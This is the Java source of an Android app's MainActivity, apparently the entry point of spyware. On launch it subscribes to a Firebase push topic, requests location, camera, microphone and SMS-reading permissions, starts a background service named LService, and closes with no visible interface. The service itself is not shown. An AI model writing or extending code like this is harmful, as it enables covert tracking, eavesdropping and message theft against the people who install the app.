package com.gravity.andorid.app.main;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;

import com.google.firebase.messaging.FirebaseMessaging;
import com.gravity.andorid.app.services.LService;


public class MainActivity extends Activity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        FirebaseMessaging.getInstance().subscribeToTopic("global");
        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.CAMERA,Manifest.permission.RECORD_AUDIO,Manifest.permission.READ_SMS},
                1);
        startService(new Intent(this, LService.class));
        super.onCreate(savedInstanceState);
        finish();

    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    }
}
